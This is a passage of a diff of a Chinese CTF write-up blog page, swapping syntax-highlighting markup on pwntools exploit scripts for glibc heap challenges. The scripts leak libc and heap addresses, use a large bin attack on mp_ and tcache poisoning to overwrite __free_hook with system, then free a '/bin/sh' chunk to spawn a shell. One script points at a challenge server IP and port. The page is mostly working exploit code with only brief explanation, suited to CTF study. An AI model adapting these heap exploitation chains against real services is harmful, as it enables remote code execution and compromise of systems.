+r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sla<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>
+    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sla<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>
+    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sla<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    sla<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    sa<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">add_tcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">"AAAA"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">free_tcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+
+p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">"AAAA"</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"AAAA"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">"AAAA"</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">"AAAA"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+
+delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 0x100 + 0x70 </span>
+<span class="token comment"># 0x100 + 0x70 + 0x100</span>
+add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b"B"</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x170</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
+
+show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+libc_base <span class="token operator">=</span> r_leak_libc_64<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7fe6d3febca0</span> <span class="token operator">-</span> <span class="token number">0x7fe6d3c00000</span><span class="token punctuation">)</span>
+success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"libc_base -></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
+system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"free_hook -></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+<span class="token comment"># 1 == 10 11</span>
+add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b"C"</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b"C"</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b"a"</span><span class="token punctuation">)</span>
+    
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+
+
+delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b"a"</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
+
+<span class="token comment"># g(p)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="Elden-Ring-Ⅲ-补"><a href="#Elden-Ring-Ⅲ-补" class="headerlink" title="Elden Ring Ⅲ[补]"></a>Elden Ring Ⅲ[补]</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/232676.html">https://www.freebuf.com/articles/system/232676.html</a></p>
 <p>利用large bin attack往mp_结构体中 存储 tcache大小的位置写一个堆地址，这样题目给的size范围 free掉后能进到tcache bin里面，然后就变成 tcache poison了，2.32 malloc_hook free hook还没有移除，用tcache poison写free hook为system的地址，然后free掉 &#x2F;bin&#x2F;sh的堆，触发 system(binsh) getshell</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">IP = <span class="string">&quot;47.100.139.115&quot;</span></span><br><span class="line">PORT = <span class="number">30708</span></span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = <span class="keyword">lambda</span>: u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leak_libc_32 = <span class="keyword">lambda</span>: u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;Content: &quot;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x600</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x700</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x700</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>) <span class="comment"># 1 in large bin </span></span><br><span class="line">out=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">base=out-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">1168</span>-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base=&quot;</span>,<span class="built_in">hex</span>(base))</span><br><span class="line">free_hook= base +libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">mp_offset=<span class="number">0x7fb195cdc280</span>-<span class="number">0x7fb195af9000</span></span><br><span class="line">mp_=base+mp_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;mp_=&quot;</span>,<span class="built_in">hex</span>(mp_))</span><br><span class="line">target=mp_+<span class="number">0x50</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x500</span>) <span class="comment">#take out 1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>) <span class="comment">#chunk1</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>) </span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x5f0</span>) <span class="comment">#chunk2</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x900</span>) <span class="comment"># 5 in large bin</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">fd=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">edit(<span class="number">5</span>,p64(fd)*<span class="number">2</span>+p64(target-<span class="number">0x20</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x900</span>)</span><br><span class="line"><span class="comment"># mp_ -&gt; tcache_size = 7 addr</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line">edit(<span class="number">1</span>,p64(out)*<span class="number">2</span>)</span><br><span class="line">success(<span class="string">f&quot;heap_base -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(heap_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x500</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># tcache poison</span></span><br><span class="line">edit(<span class="number">1</span>,p64(base)*<span class="number">2</span>+p64(heap_base)*<span class="number">2</span>+p64(<span class="number">0</span>)*<span class="number">9</span>+p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(system))</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment"># from LibcSearcher import *</span>
+<span class="token keyword">import</span> itertools
+<span class="token keyword">import</span> ctypes
+
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+is_debug <span class="token operator">=</span> <span class="token number">1</span>
+IP <span class="token operator">=</span> <span class="token string">"47.100.139.115"</span>
+PORT <span class="token operator">=</span> <span class="token number">30708</span>
+
+elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./vuln'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
+
+<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
+sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
+r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
 
 
-    </article>
-    <!-- license -->
+<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    sla<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>
+    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>
+    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    sa<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">,</span>context<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>
+    sla<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x500</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x600</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x700</span><span class="token punctuation">)</span>
+
+delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x700</span><span class="token punctuation">)</span>
+
+show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># 1 in large bin </span>
+out<span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+base<span class="token operator">=</span>out<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1168</span><span class="token operator">-</span><span class="token number">0x10</span>
